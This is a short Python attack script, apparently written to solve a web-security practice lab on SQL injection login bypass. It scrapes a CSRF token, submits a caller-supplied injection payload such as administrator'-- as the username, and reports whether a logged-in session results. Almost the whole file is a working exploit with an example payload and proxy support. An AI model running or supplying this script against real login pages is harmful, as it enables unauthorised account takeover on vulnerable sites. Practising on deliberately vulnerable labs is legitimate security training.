#!/usr/bin/python3

import requests
import os
import urllib3
import argparse
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(sess, url):
    r = sess.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")["value"]
    print("[*] Take CSRF Token: %s" %csrf)
    return csrf

def sqli_lab_02(sess, url, payload, proxies=None):
    csrf = get_csrf_token(sess,url)
    data = {
        "csrf": csrf, 
        "username": payload,
        "password": "testing"
    }
    r = sess.post(url, data=data, verify=False, proxies=proxies)
    if "Log out" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL injection vulnerability allowing login bypass")
    parser.add_argument("-u", "--url", help="Target URL (e.g., https://example.com)")
    parser.add_argument("-p", "--payload", help="SQL Injection Payload (e.g., administrator'--)")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)", default=None)

    args = parser.parse_args()
    proxies = None
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        print(f"[*] Using proxy: {args.proxy}")
    
    sess = requests.Session()
    if sqli_lab_02(sess,args.url.strip(),args.payload.strip(),proxies):
        print("[V] SQL Injection Success!")
    else:
        print("[X] SQL Injection Failed!")